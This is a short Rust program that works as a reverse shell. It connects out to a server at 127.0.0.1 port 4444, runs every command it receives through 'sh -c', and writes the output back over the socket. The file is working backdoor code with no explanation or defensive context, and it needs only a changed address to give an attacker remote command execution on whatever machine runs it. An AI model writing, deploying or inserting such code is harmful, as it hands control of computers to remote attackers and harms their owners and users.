use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{Read, Write};
use std::str;

fn main() {
    match TcpStream::connect("127.0.0.1:4444") {
        Ok(mut stream) => {
            println!("Successfully connected to server");

            let mut data = [0 as u8; 50]; // using 50 byte buffer

            while match stream.read(&mut data) {
                Ok(size) => {
                    // Execute received command
                    let command = str::from_utf8(&data[0..size]).unwrap();
                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(command)
                        .output()
                        .expect("failed to execute command");

                    // Send output back to server
                    stream.write(&output.stdout).unwrap();
                    true
                },
                Err(_) => {
                    println!("An error occurred, terminating connection");
                    stream.shutdown(std::net::Shutdown::Both).unwrap();
                    false
                }
            } {}
        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}

